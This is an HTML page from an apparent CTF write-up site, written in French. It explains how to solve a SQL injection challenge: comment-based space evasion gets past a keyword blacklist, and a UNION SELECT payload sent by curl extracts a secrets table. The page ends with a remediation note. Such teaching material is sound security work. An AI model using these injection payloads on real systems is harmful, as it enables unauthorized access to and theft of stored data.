@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Write-up — Défi 2 : Le Quine SQL - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Write-up \u2014 D\u00e9fi 2 : Le Quine SQL";
+        var mkdocs_page_input_path = "dev/writeup-defi2.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reseau</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag060-Analyse_capture_r%C3%A9seau/">Analyse_capture_réseau</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag114-pcap-forensic/">cap-forensic-mot de passe d'un archive</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag146-Packet-tracer/">Packet-tracer</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/pdf-metadata/">PDF metadata</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Cryptographie</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/Double_Encryption_0142/">Double encryption</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/Myrox_Infiltration_0143/">Myrox Infiltration</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/writeup_falsification/">Falsification</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">osint</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../osint/Atterissage_Urgence_0145/">Atterrisage Urgence</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Stegano</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../steganographie/Transmission_Alien_0141/">Transmission Alien</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reverse</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/strings-0084/">Strings on binary</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/binary-analyze-0083/">Binary analyze</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/patch-xxxx/">Binary patching</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/writeup_reverseEngineering/">ReverseEngineering</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Logiciel</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_blocsCompresse/">Blocs Compressés</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_obfuscation/">Obfuscation</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_polygotte/">Polygotte</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/emoji_jail/">Emoji_jail</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Système Linux</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Systeme/writeup_SUID_XENON-1/">XENON-1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Systeme/writeup_CronTab_HERALD-7_v2/">HERALD-7</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Systeme/writeup_DirtyPipe_PROMETHEUS-9_v2/">PROMETHEUS_9</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Systeme/writeup_PwnKit_SHADOW-5/">SHADOW-5</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Systeme/writeup_PHANTOM-4/">PHANTOM-4</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Système Windows</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag%202%20%E2%80%94%20T%C3%A2che%20planifi%C3%A9e%20%C3%A9lev%C3%A9e/">Flag 2 — Tâche planifiée élevée</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag3-ACL-AD/">Flag 3 — ACL Active Directory</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag4-Historique-PS/">Flag 4 — Historique PowerShell</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag5-SMB-Share/">Flag 5 — SMB Share</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag6-LLMNR/">Flag 6 — LLMNR</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag7-KeePass/">Flag 7 — KeePass</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag7b-Kerberos/">Flag 7b — Kerberos</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/GUIDE-COMPLET-LAB-CTF/">LAB-CTF</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Misc</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../autre/Destruction_Vaisseau_0144/">Destruction Vaisseau</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Write-up — Défi 2 : Le Quine SQL</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="write-up-defi-2-le-quine-sql">Write-up — Défi 2 : Le Quine SQL</h1>
+<p><strong>Catégorie</strong> : Programmation / SQL / Évasion<br />
+<strong>Niveau</strong> : Intermédiaire<br />
+<strong>Flag</strong> : <code>CTF{w1th0ut_sp4c3s_sql}</code><br />
+<strong>Commande de départ</strong> : <code>curl http://&lt;IP&gt;:5001</code> ou navigateur</p>
+<hr />
+<h2 id="contexte">Contexte</h2>
+<p>Le serveur expose un moteur de recherche dans une base de logs. Il applique un filtre "liste noire" qui bloque :</p>
+<pre><code>SELECT, UNION, WHERE, OR, AND, et les espaces ( )
+</code></pre>
+<p>La requête SQL construite côté serveur :</p>
+<pre><code class="language-sql">SELECT id, message, level FROM logs WHERE message LIKE '%&lt;INPUT&gt;%'
+</code></pre>
+<p>L'entrée utilisateur est concaténée directement → <strong>injection SQL</strong>.</p>
+<hr />
+<h2 id="etapes-de-resolution">Étapes de résolution</h2>
+<h3 id="1-confirmer-la-vulnerabilite">1. Confirmer la vulnérabilité</h3>
+<p>Tester avec une apostrophe <code>'</code> → erreur SQL confirmée.</p>
+<h3 id="2-remplacer-les-espaces">2. Remplacer les espaces</h3>
+<p>SQLite ignore les commentaires multilignes <code>/**/</code> entre les tokens :</p>
+<pre><code class="language-sql">-- Interdit :
+OR 1=1
+-- Bypass :
+O/**/R/**/1=1
+</code></pre>
+<h3 id="3-construire-un-union-select">3. Construire un UNION SELECT</h3>
+<p>Pour extraire la table <code>secrets</code> :</p>
+<pre><code>a%'/**/UNION/**/SELECT/**/name,value,'x'/**/FROM/**/secrets--
+</code></pre>
+<p>Ce qui produit :</p>
+<pre><code class="language-sql">SELECT id, message, level FROM logs WHERE message LIKE '%a%'
+UNION SELECT name, value, 'x' FROM secrets--'%'
+</code></pre>
+<h3 id="4-recuperer-le-flag">4. Récupérer le flag</h3>
+<pre><code class="language-bash">curl &quot;http://&lt;IP&gt;:5001/search?q=a%25'/**/UNION/**/SELECT/**/name,value,'x'/**/FROM/**/secrets--&quot;
+</code></pre>
+<p>Le tableau affiche une ligne supplémentaire avec <code>CTF{w1th0ut_sp4c3s_sql}</code>.</p>
+<hr />
+<h2 id="vulnerabilite-expliquee">Vulnérabilité expliquée</h2>
+<p>Concaténation directe de l'entrée dans la requête SQL. Un filtre liste noire est insuffisant.</p>
+<p><strong>Remédiation</strong> : Utiliser des requêtes préparées.</p>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
